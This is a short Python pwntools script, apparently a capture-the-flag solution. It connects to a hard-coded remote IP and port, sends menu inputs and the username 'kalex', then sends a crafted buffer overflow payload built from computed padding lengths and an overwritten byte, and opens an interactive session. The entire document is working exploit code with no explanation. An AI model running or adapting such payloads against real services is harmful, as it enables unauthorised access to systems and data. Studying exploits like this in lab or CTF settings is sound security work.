from pwn import *

proc = remote("109.233.56.90", 11510)
proc.sendline(b"2")
proc.sendline(b"kalex")
proc.sendline(b"kalex")
proc.send(b"a"*(int("6f", 16) - int("3d", 16)) + p8(0x1) + b"lex" + b"a"*(int("1f", 16)) + b"lex")
proc.interactive()
